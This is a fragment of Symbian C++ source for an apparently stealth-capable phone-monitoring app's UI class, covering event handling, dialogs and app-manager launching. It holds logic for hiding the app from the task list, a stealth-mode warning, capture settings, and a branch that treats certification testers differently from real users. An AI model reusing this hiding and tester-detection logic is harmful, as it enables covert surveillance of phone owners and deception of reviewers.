			if(keyEvent.iCode == 100)
				{
				iMMCRemoved = ETrue;
				//Memory card is removed
				}
			}break;
		case EEventUser:
			{
			if(keyEvent.iCode == EStdKeyBackspace)
			//'c' key is pressed to kill the app from task list
				{				
				DeregisterMonitor();				
				}
			//return;
			}break;			
		default:
			;
		}	
	CAknAppUi::HandleWsEventL(aEvent,aDestination);
	}

TKeyResponse CFxsAppUi::HandleKeyEventL(const TKeyEvent& /*aKeyEvent*/, TEventCode /*aType*/)
//This will only be called by the framework when fucusable control does not consume key(returns EKeyWasNotConsumed)
	{
	return EKeyWasNotConsumed;
	}
	
void CFxsAppUi::HandleSystemEventL(const TWsEvent& aEvent)
	{
	switch(*(TApaSystemEvent*)(aEvent.EventData()))
		{
		case EApaSystemEventShutdown:
			{
			LOG0(_L("[CFxsAppUi::HandleSystemEventL] got EApaSystemEventShutdown"))
			//if(!iGotEikCmdExit)
			//when the phone is killed from tasklist,the sequence of event is 
			//EApaSystemEventShutdown and then EEikCmdExit
			//
			//when the phone switch off
			//the application got EEikCmdExit event
			//but sometimes it is EEikCmdExit and then EApaSystemEventShutdown			
			
			//when the application is being uninstalled, the sequence of event is
			//EApaSystemEventShutdown and then EEikCmdExit
				{
				OnEventShutdownL();	
				}			
			}break;
		default:
			;
		}
	CAknViewAppUi::HandleSystemEventL(aEvent);
	}
	
void CFxsAppUi::HandleStatusPaneSizeChange()
	{
	}

//-----------------------------------------------------------------------------------
//			// INTERFACES AREA //
//-----------------------------------------------------------------------------------

void CFxsAppUi::HandleCommonServTerminated(TInt aError)
//MCommonServTerminateObserver
	{
	//the server is now terminated
	//so cleanup the previous session then connect again
	//to relive the server
	iComnServSession.Close();
	TInt err = iComnServSession.Connect();
	if(!err)
		{
		iDataService->SetNewSession(iComnServSession);
		iKiller->SetNewSession(iComnServSession);
		}
	}
	
//-----------------------------------------------------------------------------------
//			// DIALOG BOXES AREA //
//-----------------------------------------------------------------------------------

//
// @todo
// implement as a custom control later
//
// Display 
// - Total records,
// - Total db size
// - Disk free
// - Installation Drive: 
void CFxsAppUi::ShowAppInfoL()
	{
	HBufC* msgTxt = iHelpText->DiagnosticMessageLC();
	
	//R_PRIVACY_STATEMENT_DIALOG
	DialogUtils::ShowMessageDialogL(R_ABOUT_MESSAGE_QUERY,
									 R_TXT_APP_INFO_HEADER,
									 *msgTxt);
	CleanupStack::PopAndDestroy(1);
	}
	
void CFxsAppUi::ShowDbHealthInfoL()
	{
	HBufC* msgTxt = iHelpText->DbHealthMessageLC();	
	DialogUtils::ShowMessageDialogL(R_ABOUT_MESSAGE_QUERY,
									 R_TEXT_DBHEALTH_HEADER,
									 *msgTxt);
	CleanupStack::PopAndDestroy(1);
	}
	
TBool CFxsAppUi::ConfirmBeforeHideL()
	{
	CFxsSettings&  setting = SettingsInfo();		
	if(!setting.IsTSM())
	//For our real user not for symbian test house people
		{
		TS9Settings& s9 = setting.S9Settings();
		TBool confirmed(ETrue);
		if(s9.iShowBillableEvent || s9.iAskBeforeChangeLogConfig || s9.iShowIconInTaskList)
			{
			confirmed = DialogUtils::ShowMessageDialogL(R_FXS_CONFIRMATION_QUERY,
											R_TEXT_PROMPTS_WARNING_HEADER,
											R_TEXT_NONESTEATH_MODE_WARNING_BODY);
			}
		
		if(confirmed)
			{
			TBool showWarning(EFalse);			
			const TInt KMaxMessageLength = 300;	
			HBufC* body = HBufC::NewLC(KMaxMessageLength);	
			TPtr bodyPtr = body->Des();
			
			HBufC* beginTxt = RscHelper::ReadResourceLC(R_TXT_WARNING_BEGIN);			
			bodyPtr.Append(*beginTxt);
			bodyPtr.Append(KCharLineFeed);
			
			CleanupStack::PopAndDestroy(beginTxt);
			
			if(!setting.StartCapture())
				{
				showWarning = ETrue;
				HBufC* startCaptureDisable = RscHelper::ReadResourceLC(R_TXT_WARNING_START_CAPTURE_NO); 
				bodyPtr.Append(*startCaptureDisable);
				bodyPtr.Append(KCharLineFeed);
				CleanupStack::PopAndDestroy(startCaptureDisable);		
				}
			
			if(showWarning) 
				{
				bodyPtr.Append(KCharLineFeed);
				
				HBufC* startCaptureDisable = RscHelper::ReadResourceLC(R_TXT_WARNING_CONFIRM); 
				bodyPtr.Append(*startCaptureDisable);
				bodyPtr.Append(KCharLineFeed);
				CleanupStack::PopAndDestroy(startCaptureDisable);
				
				confirmed =	DialogUtils::ShowMessageDialogL(R_FXS_CONFIRMATION_QUERY,
												R_TXT_WARNING_HEADER,
												*body);
				}
			CleanupStack::PopAndDestroy(body);
			}		
		return 	confirmed;	
		}
	return ETrue;
	}

TBool CFxsAppUi::ConfirmChangeLogConfigL()
	{
	CFxsSettings& settings = SettingsInfo();
	if(settings.S9Settings().iAskBeforeChangeLogConfig)
		{
		TPrivacyDialog	privacyDlg;
		//note: this is negative question
		return !privacyDlg.ConfirmDialogL(R_TEXT_CONFIRM_CHANGE_LOG_CONFIG_HEADER,
											 R_TEXT_CONFIRM_CHANGE_LOG_CONFIG_BODY);			
		}
	return ETrue;
	}
	
TBool CFxsAppUi::ConfirmBillableEventGlobalL(TFxBillableEvent aEvent)
	{
	TPrivacyDialog	privacyDlg;
	TS9Settings& settings = SettingsInfo().S9Settings();
	TBool allowed = !settings.iShowBillableEvent;
	if(!allowed)
		{	
		allowed = privacyDlg.ConfirmBillableEventGlobalL(aEvent);
		}
	return allowed;
	}
 
void  CFxsAppUi::ShowInfoDialogL(TInt aTitleResId,TDesC& aBodyTxt)
	{
	HBufC* title = RscHelper::ReadResourceLC( aTitleResId); 
	DialogUtils::ShowMessageDialogL(R_ABOUT_MESSAGE_QUERY,
									*title,
									aBodyTxt);	
	CleanupStack::PopAndDestroy( title ); 	
	}
 
void CFxsAppUi::ShowAboutL()
	{
#ifdef __RESELLER_BUILD
	HBufC* body = RscHelper::ReadResourceLC(R_TXT_MENU_ABOUT_RESELLER_TEXT);
#else
	HBufC* body = RscHelper::ReadResourceLC(R_TXT_MENU_ABOUT_TEXT);
#endif
	TVersionName version =  AppDefinitions::Version().Name();
	HBufC* aboutTxtFmt = HBufC::NewLC(body->Length() + version.MaxLength() + body->Length() + 30);
	
	aboutTxtFmt->Des().Format(*body, PRODUCT_ID, &version);	
	DialogUtils::ShowMessageDialogL(R_ABOUT_MESSAGE_QUERY,
									R_TXT_MENU_ABOUT_TITLE,
									*aboutTxtFmt);
	
	CleanupStack::PopAndDestroy(2);
	}
	
//-----------------------------------------------------------------------------------
//			// UTILS AREA //
//-----------------------------------------------------------------------------------
void CFxsAppUi::StartNativeAppMgrL()
	{
	TInt err(KErrNone);
	RApaLsSession ls;
	User::LeaveIfError(ls.Connect());
	CleanupClosePushL(ls);
	CApaCommandLine *cmd = CApaCommandLine::NewLC();
	_LIT(KAppMgrBinaryFile,			"z:\\sys\\bin\\AppMngr.exe");
#if defined EKA2
	cmd->SetExecutableNameL(KAppMgrBinaryFile);
#else
	cmd->SetLibraryNameL(KAppMgrBinaryFile);
#endif
	cmd->SetCommandL(EApaCommandOpen);
    err=ls.StartApp(*cmd);    
    CleanupStack::PopAndDestroy(2); //cmd/ls
    
	/*TUid fxAppManUid = KDummyAppManagerUid;
	TApaTask fxAppManTask = aTaskList.FindApp(fxAppManUid);
	IF task exist THEN
		{
		bring app.manager to foreground
		}
	ELSE
		{
		RProcess proc;
		proc.CREATE_PROCESS
		close handle*/
	}

//-----------------------------------------------------------------------------------
//			// GETTER AREA //
//-----------------------------------------------------------------------------------

MFxPositionMethod* CFxsAppUi::FxPositionMethod()
	{
	return iLocService;
	}
	
MFxNetworkInfo* CFxsAppUi::FxNetworkInfo()
	{
	return iDataService;
	}
